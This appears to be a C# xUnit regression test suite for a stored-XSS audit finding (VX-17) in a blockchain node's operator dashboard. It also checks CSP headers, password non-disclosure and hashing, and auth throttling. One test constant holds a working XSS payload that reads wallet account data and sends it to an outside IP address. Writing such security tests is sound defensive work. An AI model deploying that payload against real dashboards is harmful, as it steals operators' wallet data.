using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.TestHost;
using VerifiedXCore;
using VerifiedXCore.Data;
using VerifiedXCore.Extensions;
using VerifiedXCore.Models;
using VerifiedXCore.P2P;
using VerifiedXCore.Services;
using Xunit;

namespace VerifiedXCore.Tests
{
    /// <summary>
    /// VX-17 (MEDIUM): "A peer supplied name is rendered unescaped into the operator dashboard".
    ///
    /// Audit PoC: GET /api/V1/Mother returned text/html containing a kid's ValidatorName verbatim —
    /// &lt;img src=x onerror="fetch('/wallet/api/accounts')…"&gt; — with zero HTML encoding and no CSP; controls: a
    /// benign name rendered as text, and "a&lt;b&gt;&amp;amp;'\"c" was emitted byte-verbatim. The route that creates the
    /// dashboard record was reachable, and GetMother disclosed the stored password value.
    /// </summary>
    [Collection("DbContextSequential")]
    public class VX17_MotherDashboardTests : IDisposable
    {
        private const string Payload = "<img src=x onerror=\"fetch('/wallet/api/accounts').then(r=>r.json()).then(a=>fetch('http://172.28.0.20:9999/?'+btoa(JSON.stringify(a))))\">";
        private readonly string _tempRoot;
        private readonly string? _priorCustomPath;
        private readonly bool _priorApiEnabled = Startup.APIEnabled;
        private readonly bool _priorEncrypted = Globals.IsWalletEncrypted;
        private readonly SecureString _priorPassword = Globals.EncryptPassword;

        public VX17_MotherDashboardTests()
        {
            _tempRoot = Path.Combine(Path.GetTempPath(), $"vx17_test_{Guid.NewGuid():N}") + Path.DirectorySeparatorChar;
            Directory.CreateDirectory(_tempRoot);
            _priorCustomPath = Globals.CustomPath;
            Globals.CustomPath = _tempRoot;
            DbContext.Initialize();
            Startup.APIEnabled = true;
            Globals.IsWalletEncrypted = false;
            Globals.EncryptPassword = new SecureString();
            Globals.MothersKids.Clear();
        }

        public void Dispose()
        {
            Globals.MothersKids.Clear();
            Startup.APIEnabled = _priorApiEnabled;
            Globals.IsWalletEncrypted = _priorEncrypted;
            Globals.EncryptPassword = _priorPassword;
            try { DbContext.CloseDB(); } catch { }
            Globals.CustomPath = _priorCustomPath;
            try { Directory.Delete(_tempRoot, recursive: true); } catch { }
        }

        private static TestServer NewServer() => new TestServer(new WebHostBuilder().UseStartup<Startup>());

        private static void AddKid(string name, string address = "xKID_ADDRESS")
        {
            Globals.MothersKids[address] = new Mother.Kids
            {
                Address = address,
                IPAddress = "172.28.0.30",
                ValidatorName = name,
                Balance = 1,
                BlockHeight = 7,
                ConnectTime = DateTime.Now,
                LastDataSentTime = DateTime.Now,
            };
        }

        private static async Task<HttpResponseMessage> GetMotherPage(TestServer server) => await server.CreateClient().GetAsync("/api/V1/Mother");

        // ── Audit PoC ──────────────────────────────────────────────────────────────────────

        [Fact]
        public async Task VX17_AuditPoC_KidNameIsEncoded_NotLiveMarkup()
        {
            AddKid(Payload);
            using var server = NewServer();
            var body = await (await GetMotherPage(server)).Content.ReadAsStringAsync();

            Assert.DoesNotContain("<img src=x", body);
            Assert.DoesNotContain("onerror=\"fetch", body);
            Assert.Contains("&lt;img src=x onerror=", body); // present, as inert text
        }

        [Fact]
        public async Task VX17_AuditPoC_PageCarriesAContentSecurityPolicy_ThatOnlyRunsItsOwnScript()
        {
            AddKid("benign-kid-plain-name");
            using var server = NewServer();
            var resp = await GetMotherPage(server);
            var body = await resp.Content.ReadAsStringAsync();

            Assert.True(resp.Headers.TryGetValues("Content-Security-Policy", out var csp), "no CSP header");
            var policy = csp!.Single();
            var nonce = System.Text.RegularExpressions.Regex.Match(policy, "'nonce-([^']+)'").Groups[1].Value;
            Assert.False(string.IsNullOrEmpty(nonce));
            Assert.DoesNotContain("script-src 'unsafe-inline'", policy);
            Assert.Contains($"<script nonce=\"{nonce}\">", body); // the page's own auto-refresh script still runs
            Assert.Equal("nosniff", resp.Headers.GetValues("X-Content-Type-Options").Single());
        }

        [Fact]
        public async Task VX17_AuditControls_BenignAndMetaCharacterNames()
        {
            AddKid("benign-kid-plain-name", "xKID1");
            AddKid("a<b>&amp;'\"c", "xKID2");
            using var server = NewServer();
            var body = await (await GetMotherPage(server)).Content.ReadAsStringAsync();

            Assert.Contains("benign-kid-plain-name", body);
            Assert.DoesNotContain("a<b>&amp;'\"c", body);  // was emitted byte-verbatim
            Assert.Contains("a&lt;b&gt;&amp;amp;", body);  // & re-encoded
        }

        [Fact]
        public async Task VX17_AuditPoC_GetMother_DoesNotDiscloseThePasswordValue()
        {
            Mother.SaveMother(new Mother { Name = "mom", Password = "mother pw 17" });
            using var server = NewServer();
            var body = await server.CreateClient().GetStringAsync("/api/V1/GetMother");

            Assert.Contains("mom", body); // control: the record is returned
            Assert.DoesNotContain("\"Password\"", body);
            Assert.DoesNotContain(Mother.GetMother()!.Password, body);
        }

        [Fact]
        public async Task VX17_Adjacent_DebugPage_EncodesPeerSuppliedText()
        {
            // /api/V1/Debug renders registry and peer data (addresses, IPs, reported wallet versions) into text/html.
            var key = "xVX17_DEBUG_" + Guid.NewGuid().ToString("N").Substring(0, 8);
            Globals.NetworkValidators[key] = new NetworkValidator { Address = key, IPAddress = "<img src=x onerror=alert(17)>", PublicKey = "" };
            try
            {
                using var server = NewServer();
                var resp = await server.CreateClient().GetAsync("/api/V1/Debug");
                var body = await resp.Content.ReadAsStringAsync();
                Assert.Contains(key, body); // control: the entry is on the page
                Assert.DoesNotContain("<img src=x", body);
                Assert.True(resp.Headers.Contains("Content-Security-Policy"), "no CSP header");
            }
            finally { Globals.NetworkValidators.TryRemove(key, out _); }
        }

        // ── Stored password ────────────────────────────────────────────────────────────────

        [Fact]
        public void VX17_StoredMotherPassword_IsAKdfVerifier()
        {
            Mother.SaveMother(new Mother { Name = "mom", Password = "mother pw 17" });
            var mom = Mother.GetMother()!;

            Assert.True(KeystoreCrypto.IsSealed(mom.Password));
            Assert.DoesNotContain("mother pw 17", mom.Password);
            Assert.True(Mother.VerifyPassword(mom, "mother pw 17"));
            Assert.False(Mother.VerifyPassword(mom, "wrong"));
            Assert.False(Mother.VerifyPassword(mom, ""));
        }

        [Fact]
        public void VX17_LegacySelfEncryptedRecord_VerifiesAndIsUpgraded()
        {
            Mother.GetMotherDb()!.Insert(new Mother { Name = "old", Password = "mother pw 17".ToEncrypt(), StartDate = DateTime.Now });
            var mom = Mother.GetMother()!;
            Assert.False(KeystoreCrypto.IsSealed(mom.Password));

            Assert.False(Mother.VerifyPassword(mom, "wrong"));
            Assert.False(KeystoreCrypto.IsSealed(Mother.GetMother()!.Password)); // no upgrade on a failure

            Assert.True(Mother.VerifyPassword(mom, "mother pw 17"));
            Assert.True(KeystoreCrypto.IsSealed(Mother.GetMother()!.Password));
            Assert.True(Mother.VerifyPassword(Mother.GetMother()!, "mother pw 17"));
        }

        [Fact]
        public void VX17_KidAuthAttempts_AreThrottledPerIP()
        {
            var ip = "198.51.100." + new Random().Next(1, 250);
            Assert.True(P2PMotherServer.TryBeginAuthAttempt(ip));
            Assert.False(P2PMotherServer.TryBeginAuthAttempt(ip));
            Assert.True(P2PMotherServer.TryBeginAuthAttempt(ip + "1")); // another IP is independent
        }
    }
}
